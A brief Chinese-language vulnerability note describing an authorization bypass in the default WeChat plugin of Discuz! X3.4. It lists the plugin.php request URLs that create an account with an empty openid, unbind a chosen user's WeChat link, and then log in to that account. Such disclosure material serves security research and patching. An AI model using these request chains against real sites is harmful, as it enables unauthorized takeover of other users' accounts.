由于DZ 3.4默认安装了，攻击者可以利用该漏洞越权登陆。

> 通过/plugin.php?id=wechat:wechat&ac=wxregister&username={name}这种方式可以使openid为空， 但注册的是一个新的账号。

> 解除指定uid绑定的微信：
>
> /plugin.php?id=wechat:wechat&ac=unbindmp&uid={uid}&hash={formhash}

> 登陆第一个openid为空的账号：/plugin.php?id=wechat:wechat&ac=wxregister

